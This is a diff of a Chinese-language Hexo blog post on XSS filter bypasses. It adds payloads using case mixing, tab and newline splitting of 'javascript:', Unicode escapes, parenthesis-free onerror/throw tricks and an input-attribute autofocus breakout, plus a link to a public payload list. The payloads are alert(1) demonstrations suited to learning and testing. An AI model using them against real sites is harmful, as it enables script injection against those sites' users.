@@ -17,19 +17,18 @@
   
   <title>XSS bypass | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Bypass&amp;#8195;1.hex编码)&amp;#8195;&amp;#8195; &amp;#8195;2.大小写 1&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;  ————》 &amp;lt;sCriPt&amp;gt;AlERt(1)&amp;lt;&#x2F;sCriPt&amp;gt;    &amp;#8195;3.不使用&amp;lt;&amp;gt;">
+  <meta name="description" content="Bypass&amp;#8195;1.hex编码  &amp;#8195;2.大小写 1&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;  ————》 &amp;lt;sCriPt&amp;gt;AlERt(1)&amp;lt;&#x2F;sCriPt&amp;gt;    &amp;#8195;3.空格回车Tab 1&amp;lt;img src=&amp;quot;javas	cript:alert(1)&amp;quot; width=100&amp;gt;">
 <meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS bypass">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;XSS%20bypass&#x2F;index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Bypass&amp;#8195;1.hex编码)&amp;#8195;&amp;#8195; &amp;#8195;2.大小写 1&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;  ————》 &amp;lt;sCriPt&amp;gt;AlERt(1)&amp;lt;&#x2F;sCriPt&amp;gt;    &amp;#8195;3.不使用&amp;lt;&amp;gt;">
+<meta property="og:description" content="Bypass&amp;#8195;1.hex编码  &amp;#8195;2.大小写 1&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;  ————》 &amp;lt;sCriPt&amp;gt;AlERt(1)&amp;lt;&#x2F;sCriPt&amp;gt;    &amp;#8195;3.空格回车Tab 1&amp;lt;img src=&amp;quot;javas	cript:alert(1)&amp;quot; width=100&amp;gt;">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbp1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbp1(1).png">
-<meta property="og:updated_time" content="2019-12-02T05:35:54.071Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbp.png">
+<meta property="og:updated_time" content="2019-12-02T09:29:39.537Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbp1.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbp.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -164,13 +163,48 @@
             
         </div>
         <div class="content" style="overflow: auto">
-            <h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>&#8195;1.hex编码<br><img src="/images/xssbp1.png" alt>)&#8195;&#8195;<img src="/images/xssbp1(1).png" alt></p>
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=27890306&auto=0&height=66"></iframe>
+
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>&#8195;1.hex编码</p>
+<p><img src="/images/xssbp.png" alt></p>
 <p>&#8195;2.大小写</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;  ————》 &lt;sCriPt&gt;AlERt(1)&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>&#8195;3.不使用&lt;&gt;</p>
+<p>&#8195;3.空格回车Tab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas	cript:alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>&#8195;4.拆分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>&#8195;5.Unicode编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert进行Unicode编码后\u0061\u006c\u0065\u0072\u0074</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>&#8195;6.不使用括号</p>
+<p>有的时候我们的（）会被过滤掉，那么我们就可以用throw来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;  //这个在chrome里会出现一个uncaught错误，我们可以使用一下payload</span><br><span class="line">&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>&#8195;7.不使用&lt;&gt;</p>
+<p>当输入点在input便签里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;XSStest&quot; type=text&gt;</span><br><span class="line">可以尝试</span><br><span class="line">&quot; autofocus onfocus=alert(1)//</span><br></pre></td></tr></table></figure>
+
+
+
+<p>bypass的方式有很多，我就不一一列举了，可以尝试使用下面的payload去fuzz一下</p>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xss-payload-list</a></p>
 
         </div>
         <div class="post-reply">
